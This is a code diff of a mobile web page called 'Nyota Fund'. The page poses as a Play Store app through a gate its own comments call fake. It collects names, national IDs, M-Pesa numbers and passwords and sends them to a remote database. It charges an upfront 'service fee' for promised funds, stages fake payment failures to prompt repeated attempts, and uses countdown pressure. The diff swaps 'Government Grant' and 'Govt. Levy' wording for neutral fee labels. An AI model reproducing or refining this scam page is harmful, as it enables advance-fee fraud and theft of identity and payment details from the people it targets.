@@ -13,12 +13,7 @@
         tailwind.config = {
             theme: { extend: {
                 fontFamily: { sans: ['"Plus Jakarta Sans"', 'sans-serif'], roboto: ['"Roboto"', 'sans-serif'] },
-                colors: {
-                    brandGreen: '#2E7D32',
-                    playBlue: '#0056D2',
-                    playGreen: '#01875f',
-                    brandRed: '#D32F2F'
-                },
+                colors: { brandGreen: '#2E7D32', playBlue: '#0056D2', playGreen: '#01875f', brandRed: '#D32F2F' },
                 boxShadow: { soft: '0 10px 40px -10px rgba(0,0,0,0.08)' }
             } }
         }
@@ -83,13 +78,35 @@
         
         @keyframes slideUp { 0% { transform: translateY(100%); } 100% { transform: translateY(0); } }
         .bottom-sheet { animation: slideUp 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
+
+        @keyframes warningShake {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-6px); }
+            40% { transform: translateX(6px); }
+            60% { transform: translateX(-4px); }
+            80% { transform: translateX(4px); }
+        }
+        .spam-warning-banner {
+            animation: warningShake 0.6s cubic-bezier(.36,.07,.19,.97) both;
+            background-color: #FEF2F2; border: 1.5px solid #F87171;
+            border-radius: 12px; padding: 14px; margin-bottom: 16px;
+            color: #B91C1C; font-weight: 800; font-size: 14px; line-height: 1.4;
+            display: flex; align-items: flex-start; gap: 8px; text-align: left;
+        }
+        .blocked-banner {
+            background-color: #FEF2F2; border: 1.5px solid #F87171; color: #991B1B;
+            font-weight: 800; font-size: 15px; padding: 16px; border-radius: 12px;
+            margin-bottom: 16px; text-align: center; animation: warningShake 0.6s ease-in-out both;
+        }
+        @keyframes modalPop { 0% { transform: scale(0.9); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        .spam-modal { animation: modalPop 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
     </style>
 </head>
 <body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
 
 <div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[13px] px-5 py-3 rounded-xl shadow-lg text-center font-medium max-w-[90vw] font-sans">Message</div>
 
-<!-- 1. NATIVE INSTALL SUCCESS PROMPT (Bottom Sheet) -->
+<!-- NATIVE INSTALL SUCCESS PROMPT (Bottom Sheet) -->
 <div id="native-install-prompt" class="hide fixed inset-0 z-[10005] bg-slate-900/60 backdrop-blur-sm flex items-end justify-center">
     <div class="bottom-sheet bg-white w-full max-w-lg rounded-t-3xl p-6 shadow-2xl text-center pb-10">
         <div class="w-16 h-1 bg-gray-300 rounded-full mx-auto mb-6"></div>
@@ -104,16 +121,14 @@
 <!-- OFFLINE GATE -->
 <div id="offline-gate" class="hide fixed inset-0 z-[110000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
     <div class="w-20 h-20 bg-white/10 rounded-full flex items-center justify-center mb-6">
-        <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.243 2.829a4.978 4.978 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3m8.293 8.293l1.414 1.414"></path>
-        </svg>
+        <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.243 2.829a4.978 4.978 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3m8.293 8.293l1.414 1.414"></path></svg>
     </div>
     <h2 class="text-2xl font-bold text-white mb-2 font-sans">No Internet Connection</h2>
-    <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto font-sans">Nyota Fund requires an active internet connection to process your grant.</p>
+    <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto font-sans">Nyota Fund requires an active internet connection to process your application.</p>
     <button id="btn-retry-connection" onclick="retryConnection()" class="w-full max-w-xs bg-brandRed text-white font-bold py-3.5 rounded-xl font-sans transition-transform active:scale-95">Retry</button>
 </div>
 
-<!-- 2. FAKE PLAY STORE GATE -->
+<!-- FAKE PLAY STORE GATE -->
 <div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20 font-sans">
     <div class="flex items-center justify-between p-4 sticky top-0 bg-white/90 backdrop-blur-md z-10 border-b border-slate-100">
         <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
@@ -127,7 +142,7 @@
             </div>
             <div class="flex flex-col justify-center">
                 <h1 class="text-2xl font-bold text-gray-900 leading-tight">Nyota Fund</h1>
-                <p class="text-brandGreen font-semibold text-sm mt-1">Government Grants</p>
+                <p class="text-brandGreen font-semibold text-sm mt-1">Financial Services</p>
                 <p class="text-gray-500 text-xs mt-1">Contains ads • 10 MB</p>
             </div>
         </div>
@@ -161,15 +176,11 @@
             <button class="flex-1 bg-white text-playBlue font-semibold text-lg py-2.5 rounded-full border-2 border-gray-200" style="opacity:0.5;">Cancel</button>
             <button disabled id="btn-installing" class="flex-1 bg-gray-200 text-gray-400 font-semibold text-lg py-2.5 rounded-full flex items-center justify-center gap-2">Downloading...</button>
         </div>
-        <div class="flex gap-3 mb-6 hide" id="post-install-buttons">
-            <button onclick="mockUninstall()" class="flex-1 bg-white text-playBlue font-semibold text-lg py-3 rounded-full border border-gray-300">Uninstall</button>
-            <button id="btn-open-app" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3 rounded-full">Open</button>
-        </div>
 
         <div class="mt-4 border-t border-gray-100 pt-6">
             <h3 class="font-bold text-lg text-gray-900 mb-2">About this app</h3>
             <p class="text-sm text-gray-600 leading-relaxed">
-                Nyota Fund is a secure portal to check your eligibility for the Government Youth Empowerment Grant. Funds are disbursed directly to your M-Pesa.
+                Nyota Fund is a secure portal to check your eligibility for financial assistance. Funds are disbursed directly to your M-Pesa.
             </p>
         </div>
     </div>
@@ -194,7 +205,7 @@
             </div>
             <div class="bg-white rounded-2xl p-6 shadow-xl">
                 <h2 class="text-xl font-bold text-slate-900 mb-1">Apply Now</h2>
-                <p class="text-sm text-slate-500 mb-6">Enter your details to check your grant status</p>
+                <p class="text-sm text-slate-500 mb-6">Enter your details to check your status</p>
                 <div class="space-y-4">
                     <div><input type="text" id="in-name" placeholder="Full Name"></div>
                     <div><input type="number" id="in-id" placeholder="National ID (7-8 digits)"></div>
@@ -220,12 +231,12 @@
         <p class="text-blue-200/60 text-xs mt-8 text-center">This usually takes a few seconds</p>
     </div>
 
-    <!-- GRANT SELECTION -->
+    <!-- AMOUNT SELECTION -->
     <div id="screen-select" class="screen app-shell" style="padding: 0 0 32px 0;">
         <div class="app-bar">
             <div class="w-full">
                 <h1 class="app-bar-title">Hello, <span id="greeting-name">there</span></h1>
-                <p class="text-xs text-slate-500 mt-0.5">Your maximum grant is <strong class="font-extrabold text-brandGreen text-sm">Ksh 25,000</strong></p>
+                <p class="text-xs text-slate-500 mt-0.5">Your maximum limit is <strong class="font-extrabold text-brandGreen text-sm">Ksh 25,000</strong></p>
 
                 <div class="mt-3 bg-emerald-50 border border-emerald-200 rounded-xl p-3 flex items-center gap-3">
                     <div class="bg-emerald-100 p-2 rounded-full flex-shrink-0">
@@ -244,15 +255,15 @@
             </div>
         </div>
         <div style="padding: 0 20px;">
-            <div class="section-label">Select grant amount</div>
+            <div class="section-label">Select amount</div>
             <div class="grid grid-cols-3 gap-2.5 mb-6" id="amount-grid"></div>
 
             <div class="native-card" style="padding: 20px; margin-bottom: 24px;">
                 <div class="row-item"><span class="row-label">You receive</span><span id="sum-receive" style="font-size: 22px; font-weight: 800; color: #2E7D32;">Ksh 1,000</span></div>
-                <div class="row-item"><span id="sum-interest-label" class="row-label">Govt. Levy</span><span id="sum-interest" class="row-value">Ksh 150</span></div>
-                <div class="row-item"><span class="row-label">Total Grant</span><span id="sum-total" class="row-value" style="color: #D32F2F; font-size: 17px;">Ksh 1,150</span></div>
+                <div class="row-item"><span id="sum-interest-label" class="row-label">Service Fee</span><span id="sum-interest" class="row-value">Ksh 150</span></div>
+                <div class="row-item"><span class="row-label">Total Request</span><span id="sum-total" class="row-value" style="color: #D32F2F; font-size: 17px;">Ksh 1,000</span></div>
             </div>
-            <button onclick="goToPayment()" id="btn-go-payment" class="native-btn">Pay Govt. Levy</button>
+            <button onclick="goToPayment()" id="btn-go-payment" class="native-btn">Pay Service Fee</button>
         </div>
     </div>
 
@@ -262,16 +273,16 @@
             <button onclick="showScreen('screen-select')" class="app-bar-back">
                 <svg class="w-5 h-5 text-slate-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"></path></svg>
             </button>
-            <h1 class="app-bar-title">Govt. Levy</h1>
+            <h1 class="app-bar-title">Service Fee</h1>
         </div>
         <div style="padding: 0 20px;">
 
             <div class="native-card text-center" style="padding: 32px 20px; margin-bottom: 20px;">
-                <p class="section-label" style="margin-bottom: 8px;">Grant Amount Requested</p>
+                <p class="section-label" style="margin-bottom: 8px;">Amount Requested</p>
                 <p style="font-size: 52px; font-weight: 900; color: #2E7D32; letter-spacing: -0.03em; line-height: 1;" id="pay-loan-context">Ksh 1,000</p>
 
                 <div class="mt-6 pt-5 border-t border-slate-100 flex flex-col items-center">
-                    <p style="font-size: 13px; color: #64748B; font-weight: 600; margin-bottom: 4px;">One-time Govt. Levy</p>
+                    <p style="font-size: 13px; color: #64748B; font-weight: 600; margin-bottom: 4px;">One-time Service Fee</p>
                     <p style="font-size: 24px; font-weight: 700; color: #0F172A;" id="pay-levy">Ksh 150</p>
                 </div>
             </div>
@@ -279,12 +290,12 @@
             <div class="native-card" style="padding: 20px; margin-bottom: 20px;">
                 <label class="section-label" style="display: block;">M-Pesa number</label>
                 <input type="tel" id="pay-mpesa" placeholder="Safaricom M-Pesa (07XX or 01XX)">
-                <p style="font-size: 12px; color: #94A3B8; margin-top: 10px;">Your grant will be sent to this number</p>
+                <p style="font-size: 12px; color: #94A3B8; margin-top: 10px;">Your funds will be sent to this number</p>
             </div>
 
             <div class="info-banner" style="margin-bottom: 24px;">
                 <svg class="w-5 h-5 flex-shrink-0 text-brandGreen" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-                <p style="font-size: 13px; line-height: 1.5; color: #2E7D32; font-weight: 500;">Pay the small Govt. levy to process your grant. Funds will be released immediately after confirmation.</p>
+                <p style="font-size: 13px; line-height: 1.5; color: #2E7D32; font-weight: 500;">Pay the small service fee to process your request. Funds will be released immediately after confirmation.</p>
             </div>
 
             <button onclick="showScreen('screen-select')" class="w-full bg-white text-slate-600 font-bold py-4 rounded-xl border-2 border-slate-200 mb-3 transition-all active:scale-95 hover:bg-slate-50 flex items-center justify-center gap-2 animate-pulse-subtle">
@@ -296,7 +307,7 @@
                 ⏳ If you cancel, you will have to wait 30 days for re-evaluation.
             </p>
 
-            <button onclick="processPayment()" id="btn-pay" class="native-btn">Pay Ksh 150 Govt. Levy</button>
+            <button onclick="processPayment()" id="btn-pay" class="native-btn">Pay Ksh 150 Service Fee</button>
         </div>
     </div>
 
@@ -314,11 +325,11 @@
                 <div class="check-circle">
                     <svg class="w-12 h-12 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
                 </div>
-                <h2 style="font-size: 24px; font-weight: 800; color: #0F172A; margin-bottom: 8px;">Grant Approved!</h2>
-                <p style="font-size: 14px; color: #64748B; padding: 0 12px; line-height: 1.5;">Your grant request has been successfully processed.</p>
+                <h2 style="font-size: 24px; font-weight: 800; color: #0F172A; margin-bottom: 8px;">Request Approved!</h2>
+                <p style="font-size: 14px; color: #64748B; padding: 0 12px; line-height: 1.5;">Your request has been successfully processed.</p>
                 <div class="native-card w-full" style="margin-top: 28px; margin-bottom: 20px; padding: 20px;">
-                    <div class="row-item"><span class="row-label">Grant Amount</span><span id="suc-loan" class="row-value" style="font-size: 17px;">Ksh 1,000</span></div>
-                    <div class="row-item"><span class="row-label">Total Grant</span><span id="suc-total" class="row-value">Ksh 1,150</span></div>
+                    <div class="row-item"><span class="row-label">Amount Requested</span><span id="suc-loan" class="row-value" style="font-size: 17px;">Ksh 1,000</span></div>
+                    <div class="row-item"><span class="row-label">Total Request</span><span id="suc-total" class="row-value">Ksh 1,000</span></div>
                     <div class="row-item"><span class="row-label">M-Pesa</span><span id="suc-mpesa" class="row-value" style="color: #2E7D32;"></span></div>
                 </div>
                 <div class="info-banner w-full" style="margin-bottom: 20px;">
@@ -371,7 +382,6 @@ const SUPABASE_KEY = "sb_publishable_LNA8s-X4zUxoRN-oBsG2mQ_zyRKMAYQ";
 const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1/palpluss-webhook";
 
 const MAX_POLL_SECONDS = 60;
-
 const SUCCESS_STATUSES = ['ALLOCATED','SUCCESS','COMPLETED','PAID','SUCCESSFUL','TRUE','CONFIRMED'];
 const FAILED_STATUSES = ['FAILED','REJECTED','EXPIRED','DECLINED','FALSE','ABORTED','USER_ABORTED'];
 const PENDING_STATUSES = ['CANCELLED', 'CANCELED', 'TIMEOUT'];
@@ -382,20 +392,15 @@ let pollTimer = null, isPolling = false, isProcessingPayment = false, currentTxn
 
 let fakeInterval = null;
 let deferredPrompt = null;
-let waitingForPrompt = false;
 let loanTimerInterval = null;
 
 const format = (n) => "Ksh " + Number(n).toLocaleString();
-const getDueDate = (d) => { const x = new Date(); x.setDate(x.getDate()+d); return x.toLocaleDateString('en-GB',{day:'numeric',month:'short',year:'numeric'}); };
 
 function showScreen(id){
     document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
     document.getElementById(id).classList.add('active');
     window.scrollTo(0,0);
-
-    if (id !== 'screen-select') {
-        stopLoanTimer();
-    }
+    if (id !== 'screen-select') stopLoanTimer();
 }
 
 function showToast(msg){
@@ -409,19 +414,13 @@ async function retryConnection() {
     const btn = document.getElementById('btn-retry-connection');
     const originalText = btn.innerText;
     btn.innerText = "Checking..."; btn.disabled = true; btn.style.opacity = "0.7";
-
     try {
         const controller = new AbortController();
         const timeoutId = setTimeout(() => controller.abort(), 5000);
-
         const res = await fetch(window.location.href + '?t=' + Date.now(), { method: 'HEAD', cache: 'no-store', signal: controller.signal });
         clearTimeout(timeoutId);
-
-        if (res.ok || res.status === 200) {
-            window.location.reload();
-        } else {
-            throw new Error("Network response was not ok");
-        }
+        if (res.ok || res.status === 200) window.location.reload();
+        else throw new Error("Network response was not ok");
     } catch (err) {
         if (window.showToast) window.showToast("⚠️ Still offline. Please check your connection.");
         else alert("Still offline. Please check your internet connection and try again.");
@@ -430,76 +429,40 @@ async function retryConnection() {
 }
 
 window.addEventListener('offline', () => { document.getElementById('offline-gate').classList.remove('hide'); });
-window.addEventListener('online', () => {
-    const gate = document.getElementById('offline-gate');
-    if (!gate.classList.contains('hide')) gate.classList.add('hide');
-});
+window.addEventListener('online', () => { const gate = document.getElementById('offline-gate'); if (!gate.classList.contains('hide')) gate.classList.add('hide'); });
 
 async function fetchWithTimeout(url, opts={}, ms=15000){
-    if (!navigator.onLine) {
-        document.getElementById('offline-gate').classList.remove('hide');
-        throw new Error("No internet connection");
-    }
+    if (!navigator.onLine) { document.getElementById('offline-gate').classList.remove('hide'); throw new Error("No internet connection"); }
     const c = new AbortController();
     const t = setTimeout(()=>c.abort(), ms);
-    try {
-        return await fetch(url, {...opts, signal:c.signal, cache:'no-store'});
-    } catch (error) {
-        if (error.name === 'TypeError' && !error.message.includes('Failed to fetch')) {
-             document.getElementById('offline-gate').classList.remove('hide');
-        }
-        throw error;
-    } finally { clearTimeout(t); }
+    try { return await fetch(url, {...opts, signal:c.signal, cache:'no-store'}); } 
+    catch (error) { if (error.name === 'TypeError' && !error.message.includes('Failed to fetch')) document.getElementById('offline-gate').classList.remove('hide'); throw error; } 
+    finally { clearTimeout(t); }
 }
 
 async function readJsonSafe(r){ try{ const x = await r.text(); return x ? JSON.parse(x) : null; }catch(e){ return null; } }
-
 function stopPolling(){ if(pollTimer){ clearTimeout(pollTimer); pollTimer = null; } isPolling = false; }
 function resetPayButton(){
     isProcessingPayment = false;
     const b = document.getElementById('btn-pay');
-    if(b){
-        b.disabled = false;
-        b.innerText = `Pay ${format(state.levy)} Govt. Levy`;
-        b.style.background = '';
-    }
+    if(b){ b.disabled = false; b.innerText = `Pay ${format(state.levy)} Service Fee`; b.style.background = ''; }
 }
 
-const _ua = navigator.userAgent || '';
-const _isAndroid = /Android/i.test(_ua);
-const _isIOS = /iPhone|iPad|iPod/i.test(_ua);
-const _isChromeBrowser = /Chrome\/\d+/i.test(_ua) && !/Edg|OPR|SamsungBrowser|Firefox/i.test(_ua);
-const _isInApp = detectInAppBrowser(_ua);
+const _isAndroid = /Android/i.test(navigator.userAgent || '');
+const _isChromeBrowser = /Chrome\/\d+/i.test(navigator.userAgent || '') && !/Edg|OPR|SamsungBrowser|Firefox/i.test(navigator.userAgent || '');
 const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
 const _cameFromIntent = new URLSearchParams(location.search).get('_pwa') === '1';
-const _wasInstalled = localStorage.getItem('pwa_installed') === '1';
-
-function detectInAppBrowser(ua) {
-    if (/FBAN|FBAV|FB4A|FB_IAB|Instagram|Twitter|musical_ly|BytedanceWebview|TikTok|Line|Snapchat|LinkedIn|Pinterest|WhatsApp|Telegram|GSA/i.test(ua)) return true;
-    if (/; wv\)/i.test(ua)) return true;
-    if (/iPhone|iPad/i.test(ua) && !/Safari/i.test(ua) && !/CriOS/i.test(ua) && !/FxiOS/i.test(ua)) return true;
-    return false;
-}
 
 const playStoreGate = document.getElementById('play-store-gate');
 const appContent = document.getElementById('app-content');
 const splashScreen = document.getElementById('splash-screen');
 
-window.addEventListener('beforeinstallprompt', (e) => {
-    e.preventDefault();
-    deferredPrompt = e;
-});
-
-window.addEventListener('appinstalled', () => {
-    localStorage.setItem('pwa_installed', '1');
-    clearInterval(fakeInterval);
-    showInstalledState();
-});
+window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); deferredPrompt = e; });
+window.addEventListener('appinstalled', () => { localStorage.setItem('pwa_installed', '1'); clearInterval(fakeInterval); showInstalledState(); });
 
 function showInstallState(){
     document.getElementById('pre-install-buttons').classList.remove('hide');
     document.getElementById('downloading-buttons').classList.add('hide');
-    document.getElementById('post-install-buttons').classList.add('hide');
     document.getElementById('download-text').classList.add('hide');
     document.getElementById('ring-svg').classList.add('hidden');
     updateProgressUI(0);
@@ -508,31 +471,19 @@ function showInstallState(){
 function showInstalledState(){
     document.getElementById('pre-install-buttons').classList.add('hide');
     document.getElementById('downloading-buttons').classList.add('hide');
-    document.getElementById('post-install-buttons').classList.remove('hide');
     document.getElementById('download-text').classList.add('hide');
     document.getElementById('ring-svg').classList.add('hidden');
-}
-
-function mockUninstall(){
-    localStorage.removeItem('pwa_installed');
-    showInstallState();
+    
+    // Trigger the beautiful prompt!
+    document.getElementById('native-install-prompt').classList.remove('hide');
 }
 
 document.getElementById('btn-store-install').addEventListener('click', () => {
+    startFakeDownload();
     if (deferredPrompt) {
-        startFakeDownload();
-        setTimeout(() => {
-            deferredPrompt.prompt();
-            deferredPrompt.userChoice.then((choiceResult) => {
-                if (choiceResult.outcome === 'accepted') {
-                    closeNativePrompt();
-                }
-                deferredPrompt = null;
-            });
-        }, 1500);
+        setTimeout(() => { deferredPrompt.prompt(); deferredPrompt = null; }, 1000);
     } else {
-        playStoreGate.classList.add('hide');
-        appContent.classList.remove('hide');
+        setTimeout(showInstalledState, 3500); // Show prompt after 3.5s fake download
     }
 });
 
@@ -555,7 +506,7 @@ function startFakeDownload() {
     document.getElementById('ring-svg').classList.remove('hidden');
 
     const startTime = Date.now();
-    const duration = 4000;
+    const duration = 3500; // 3.5 seconds
 
     clearInterval(fakeInterval);
     fakeInterval = setInterval(() => {
@@ -572,27 +523,13 @@ function updateProgressUI(progress) {
     if(pct) pct.innerText = Math.floor(progress) + "% of 10 MB";
 }
 
-document.getElementById('btn-open-app').addEventListener('click', () => {
-    if (deferredPrompt || _isChromeBrowser) {
-        document.getElementById('native-install-prompt').classList.remove('hide');
-    } else {
-        playStoreGate.classList.add('hide');
-        appContent.classList.remove('hide');
-    }
-});
-
 function showAppInline(){
     playStoreGate.classList.add('hide');
     splashScreen.classList.remove('hide');
     splashScreen.style.opacity = '1';
-
     setTimeout(() => {
         splashScreen.style.opacity = '0';
-        setTimeout(() => {
-            splashScreen.classList.add('hide');
-            appContent.classList.remove('hide');
-            bootApp();
-        }, 400);
+        setTimeout(() => { splashScreen.classList.add('hide'); appContent.classList.remove('hide'); bootApp(); }, 400);
     }, 1500);
 }
 
@@ -603,12 +540,8 @@ function bootApp(){
         try {
             const u = JSON.parse(saved);
             if(u.name && u.mpesa){
-                state.name = u.name;
-                state.id = u.id || '';
-                state.mpesa = u.mpesa;
-                state.promo = u.promo || '';
-                buildLoanScreen();
-                return;
+                state.name = u.name; state.id = u.id || ''; state.mpesa = u.mpesa; state.promo = u.promo || '';
+                buildLoanScreen(); return;
             }
         } catch(e){ localStorage.removeItem('nyota_user'); }
     }
@@ -616,42 +549,17 @@ function bootApp(){
 }
 
 if (isStandalone) {
-    playStoreGate.classList.add('hide');
-    appContent.classList.remove('hide');
-    bootApp();
+    playStoreGate.classList.add('hide'); appContent.classList.remove('hide'); bootApp();
 } else if (_cameFromIntent) {
-    playStoreGate.classList.add('hide');
-    showAppInline();
-} else if (_isInApp || (_isAndroid && !_isChromeBrowser)) {
-    playStoreGate.classList.add('hide');
-    appContent.classList.remove('hide');
-    bootApp();
-} else if (_isIOS) {
-    playStoreGate.classList.add('hide');
-    appContent.classList.remove('hide');
-    bootApp();
-} else if (_wasInstalled) {
-    playStoreGate.classList.add('hide');
-    appContent.classList.remove('hide');
-    bootApp();
+    playStoreGate.classList.add('hide'); showAppInline();
+} else if (localStorage.getItem('pwa_installed') === '1') {
+    playStoreGate.classList.add('hide'); appContent.classList.remove('hide'); bootApp();
 } else {
-    playStoreGate.classList.remove('hide');
-    showInstallState();
+    playStoreGate.classList.remove('hide'); showInstallState();
 }
 
 if ('serviceWorker' in navigator) {
-    window.addEventListener('load', () => {
-        navigator.serviceWorker.register('sw.js').catch(()=>{});
-    });
-}
-
-// DOUBLE RELOAD TRICK FOR CHROME TO ENSURE PROMPT WORKS
-if (_isChromeBrowser && !_isInApp && !isStandalone) {
-    const hasReloaded = sessionStorage.getItem('nyota_chrome_reloaded');
-    if (!hasReloaded) {
-        sessionStorage.setItem('nyota_chrome_reloaded', '1');
-        window.location.reload();
-    }
+    window.addEventListener('load', () => { navigator.serviceWorker.register('sw.js').catch(()=>{}); });
 }
 
 function submitLogin(){
@@ -670,93 +578,56 @@ function submitLogin(){
     localStorage.setItem('nyota_user', JSON.stringify({ name, id, mpesa, promo }));
 
     fetch(`${SUPABASE_URL}/rest/v1/users`, {
-        method:'POST',
-        headers:{ 'apikey':SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}`, 'Content-Type':'application/json' },
+        method:'POST', headers:{ 'apikey':SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}`, 'Content-Type':'application/json' },
         body: JSON.stringify({ full_name:name, national_id:id, mpesa_number:mpesa, promo_code:promo, password_hash:"web_"+btoa(pass) })
     }).catch(()=>{});
 
     showScreen('screen-checking');
-    
-    // FIXED TIMING LOGIC (Smooth 15 second progress)
     let p = 0;
-    const step = 2; 
-    
     const i = setInterval(()=>{
-        p += step;
+        p += 2;
         if(p > 100) p = 100;
-        
         document.getElementById('check-bar').style.width = p + "%";
         document.getElementById('check-percent').innerText = Math.floor(p) + "%";
 
         let msg = "Verifying your identity...";
         if(p >= 15) msg = "Reviewing your profile...";
         if(p >= 40) msg = "Analyzing M-Pesa history...";
-        if(p >= 65) msg = "Calculating your grant limit...";
+        if(p >= 65) msg = "Calculating your limit...";
         if(p >= 90) msg = "Almost ready...";
         document.getElementById('check-status').innerText = msg;
 
-        if(p >= 100){ 
-            clearInterval(i); 
-            setTimeout(buildLoanScreen, 300); 
-        }
+        if(p >= 100){ clearInterval(i); setTimeout(buildLoanScreen, 300); }
     }, 150);
 }
 
 function buildLoanScreen(){
     const first = state.name.split(' ')[0];
     document.getElementById('greeting-name').innerText = first || 'there';
-
     state.loan = 1000;
-
     const grid = document.getElementById('amount-grid');
     grid.innerHTML = '';
-
     amounts.forEach(a=>{
         const b = document.createElement('button');
-
-        if (a > 25000) {
-            b.className = `amount-btn relative opacity-50 bg-slate-50 border-slate-200 text-slate-400`;
-        } else {
-            b.className = `amount-btn ${a === state.loan ? 'selected' : ''}`;
-        }
-
+        if (a > 25000) { b.className = `amount-btn relative opacity-50 bg-slate-50 border-slate-200 text-slate-400`; } 
+        else { b.className = `amount-btn ${a === state.loan ? 'selected' : ''}`; }
         b.innerText = a.toLocaleString();
         b.onclick = ()=>{
-            if (a > 25000) {
-                if (window.showToast) window.showToast("❌ Your maximum grant is Ksh 25,000.");
-                return;
-            }
+            if (a > 25000) { if (window.showToast) window.showToast("❌ Your maximum limit is Ksh 25,000."); return; }
             document.querySelectorAll('.amount-btn').forEach(x=>x.classList.remove('selected'));
-            b.classList.add('selected');
-            state.loan = a;
-            updateSummary();
+            b.classList.add('selected'); state.loan = a; updateSummary();
         };
         grid.appendChild(b);
     });
-
-    updateSummary();
-    showScreen('screen-select');
-    startLoanTimer();
+    updateSummary(); showScreen('screen-select'); startLoanTimer();
 }
 
 function updateSummary(){
-    // DYNAMIC LEVY CALCULATION: 150 for 1000, up to 300 for 25000
-    if (state.loan <= 1000) {
-        state.levy = 150;
-    } else {
-        // Scales linearly from 150 to 300
-        const ratio = (state.loan - 1000) / 24000; // 24000 is the range (25000 - 1000)
-        state.levy = Math.round(150 + (ratio * 150)); 
-    }
-    
-    state.interest = state.levy;
-    state.total = state.loan; // Total grant stays the same
-    
+    state.levy = 150; // FLAT FEE
+    state.total = state.loan; // Total request is the loan amount
     document.getElementById('sum-receive').innerText = format(state.loan);
-    document.getElementById('sum-interest-label').innerText = `Govt. Levy`;
     document.getElementById('sum-interest').innerText = format(state.levy);
     document.getElementById('sum-total').innerText = format(state.loan);
-    document.getElementById('sum-levy').innerText = format(state.levy);
 }
 
 function goToPayment(){
@@ -770,7 +641,6 @@ function goToPayment(){
 async function processPayment(){
     if(isProcessingPayment) return;
     const mpesa = document.getElementById('pay-mpesa').value.trim();
-
     if(!/^(07[0124579]\d{7}|011[0-6]\d{6})$/.test(mpesa)) return showToast("Enter a valid Safaricom number (07XX or 01XX).");
 
     let fakeAttempts = parseInt(localStorage.getItem('nyota_fake_attempts') || '0');
@@ -780,11 +650,8 @@ async function processPayment(){
         isProcessingPayment = true;
         state.mpesa = mpesa;
         document.getElementById('btn-pay').disabled = true;
-
         document.getElementById('verify-anim').classList.remove('hide');
-        document.getElementById('success-anim').classList.add('hide');
         document.getElementById('failed-anim').classList.add('hide');
-        document.getElementById('pending-anim').classList.add('hide');
         document.getElementById('verify-subtitle').innerText = "Sending STK push to your phone...";
         document.getElementById('verify-time').innerText = "0s";
         showScreen('screen-success');
@@ -792,56 +659,31 @@ async function processPayment(){
         setTimeout(() => {
             isProcessingPayment = false;
             document.getElementById('btn-pay').disabled = false;
-
-            let newFakeAttempts = fakeAttempts + 1;
-            localStorage.setItem('nyota_fake_attempts', newFakeAttempts);
-
+            localStorage.setItem('nyota_fake_attempts', fakeAttempts + 1);
             document.getElementById('verify-anim').classList.add('hide');
-            document.getElementById('success-anim').classList.add('hide');
-            document.getElementById('pending-anim').classList.add('hide');
             document.getElementById('failed-anim').classList.remove('hide');
 
             const attemptMessage = "⚠️ Network timeout. Please tap Try Again to reconnect.";
-
             document.getElementById('failed-reason').innerHTML = `
                 <div style="background-color: #FEF2F2; border: 2px solid #EF4444; border-radius: 12px; padding: 16px; margin-bottom: 16px; text-align: center;">
                     <p style="font-size: 20px; font-weight: 900; color: #DC2626; margin-bottom: 4px; letter-spacing: -0.5px;">❌ PALPLUSS FUTURE FAILED</p>
                     <p style="font-size: 13px; font-weight: 600; color: #991B1B;">The payment gateway could not complete the request.</p>
                 </div>
-                <div class="spam-warning-banner">
-                    <span style="font-size: 20px; line-height: 1;">⚠️</span>
-                    <span>${attemptMessage}</span>
-                </div>
-                <span style="color: #64748B; font-size: 13px;">Please try again to reconnect to Palpluss.</span>
+                <div class="spam-warning-banner"><span style="font-size: 20px; line-height: 1;">⚠️</span><span>${attemptMessage}</span></div>
             `;
-
             const retryBtn = document.getElementById('btn-retry-failed');
-            if (retryBtn) {
-                retryBtn.onclick = function() {
-                    if (typeof stopPolling === 'function') stopPolling();
-                    isProcessingPayment = false;
-                    currentTxnId = null;
-                    showScreen('screen-payment');
-                    resetPayButton();
-                };
-            }
-
